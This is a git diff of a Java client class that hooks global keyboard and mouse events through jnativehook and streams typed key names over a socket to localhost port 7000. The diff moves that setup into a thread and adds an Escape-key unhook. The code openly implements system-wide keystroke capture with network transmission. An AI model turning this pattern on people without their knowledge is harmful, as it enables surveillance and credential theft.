@@ -10,12 +10,15 @@ import org.jnativehook.mouse.NativeMouseWheelListener;
 import java.io.*;
 import java.net.*;
 
-public class Client implements NativeKeyListener, NativeMouseInputListener, NativeMouseWheelListener {
+public class Client extends Thread implements NativeKeyListener, NativeMouseInputListener, NativeMouseWheelListener {
+
+
     private static FileWriter filewriter;
     private static BufferedWriter bufferedWriter;
     private static ObjectOutputStream objectOutputStream;
-
+/*
     public static void main(String[] args) throws NativeHookException, IOException {
+
         Socket socket = new Socket("localhost", 2000);
         objectOutputStream = new ObjectOutputStream(socket.getOutputStream());
         GlobalScreen.registerNativeHook();
@@ -23,13 +26,36 @@ public class Client implements NativeKeyListener, NativeMouseInputListener, Nati
         GlobalScreen.addNativeMouseListener(new Client());
         GlobalScreen.addNativeMouseMotionListener(new Client());
         GlobalScreen.addNativeMouseWheelListener(new Client());
+
     }
+*/
+    public void run() {
+        try {
+            Socket socket = new Socket("localhost", 7000);
+            objectOutputStream = new ObjectOutputStream(socket.getOutputStream());
+            GlobalScreen.registerNativeHook();
+            GlobalScreen.addNativeKeyListener(new Client());
+            GlobalScreen.addNativeMouseListener(new Client());
+            GlobalScreen.addNativeMouseMotionListener(new Client());
+            GlobalScreen.addNativeMouseWheelListener(new Client());
+        } catch (Exception e) {
+            System.out.println(e);
+        }
+    }
+
 
     //native event listeners
     @Override
     public void nativeKeyTyped(NativeKeyEvent e) {
         try {
             objectOutputStream.writeUTF("Key Typed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
+            if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
+                try {
+                    GlobalScreen.unregisterNativeHook();
+                } catch (NativeHookException nativeHookException) {
+                    nativeHookException.printStackTrace();
+                }
+            }
         } catch (IOException f) {
             System.out.println(f);
         }
@@ -48,7 +74,7 @@ public class Client implements NativeKeyListener, NativeMouseInputListener, Nati
 
     }
 
-    //qwerrty
+    //qwerty
  /*
  This method records all the released keys
  */
@@ -134,4 +160,5 @@ public class Client implements NativeKeyListener, NativeMouseInputListener, Nati
             e.printStackTrace();
         }
     }
+
 }
